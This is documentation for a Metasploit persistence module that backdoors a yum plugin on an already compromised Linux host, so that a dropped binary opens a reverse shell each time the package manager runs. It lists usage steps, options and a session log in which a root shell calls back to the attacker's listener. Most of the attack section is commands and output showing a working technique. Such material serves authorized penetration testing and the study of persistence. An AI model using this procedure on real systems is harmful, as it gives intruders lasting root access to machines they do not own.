## Description

This module will run a payload when the package manager is used. No
handler is ran automatically so you must configure an appropriate
exploit/multi/handler to connect. Module modifies a yum plugin to
launch a binary of choice. grep -F 'enabled=1' /etc/yum/pluginconf.d/
will show what plugins are currently enabled on the system.

## Verification Steps

1. Exploit a box that uses Yum 
2. `use linux/local/yum_package_manager_persistence`
3. `set SESSION <id>`
4. `set PAYLOAD cmd/unix/reverse_python` configure the payload as needed
5. `exploit`

When the system runs yum update the payload will launch.  You must set handler accordingly.

## Options

**BACKDOOR_NAME**
Name of backdoor executable
 
**PLUGIN**
Name of the yum plugin to target 
  
**WritableDir**
Writable directory for backdoor default is (/usr/local/bin/)       

**PluginPath**
Plugin path to use default is (/usr/lib/yum-plugins/)

## Scenarios

### Tested on Fedora 21

```
msf5 exploit(linux/local/yum_package_manager_persistence) > sessions

Active sessions
===============

  Id  Name  Type             Information  Connection
  --  ----  ----             -----------  ----------
  1         shell x86/linux               172.22.222.136:4444 -> 172.22.222.135:43790 (172.22.222.135)

msf5 exploit(linux/local/yum_package_manager_persistence) > set session 1
session => 1
msf5 exploit(linux/local/yum_package_manager_persistence) > set plugin langpacks
plugin => langpacks
msf5 exploit(linux/local/yum_package_manager_persistence) > set lhost 172.22.222.136 
lhost => 172.22.222.136
msf5 exploit(linux/local/yum_package_manager_persistence) > exploit

[*] /usr/lib/yum-plugins/langpacks.py
[+] Plugins are enabled!
[*] Attempting to modify plugin
[*] Backdoor uploaded to /usr/local/bin/z9fJTx2wVg
[*] Backdoor will run on next Yum update
msf5 exploit(linux/local/yum_package_manager_persistence) > [*] Command shell session 2 opened (172.22.222.136:4444 -> 172.22.222.135:43791) at 2019-04-30 06:21:12 -0500

msf5 exploit(linux/local/yum_package_manager_persistence) > sessions

Active sessions
===============

  Id  Name  Type             Information  Connection
  --  ----  ----             -----------  ----------
  1         shell x86/linux               172.22.222.136:4444 -> 172.22.222.135:43790 (172.22.222.135)
  2         shell cmd/unix                172.22.222.136:4444 -> 172.22.222.135:43791 (172.22.222.135)

msf5 exploit(linux/local/yum_package_manager_persistence) > sessions -i 2
[*] Starting interaction with 2...

id    
uid=0(root) gid=0(root) groups=0(root)
uname -a
Linux localhost.localdomain 3.17.4-301.fc21.x86_64 #1 SMP Thu Nov 27 19:09:10 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux
exit
[*] 172.22.222.135 - Command shell session 2 closed.
msf5 exploit(linux/local/yum_package_manager_persistence) > 
```

Note: Session 2 is received after running yum update on the remote host.
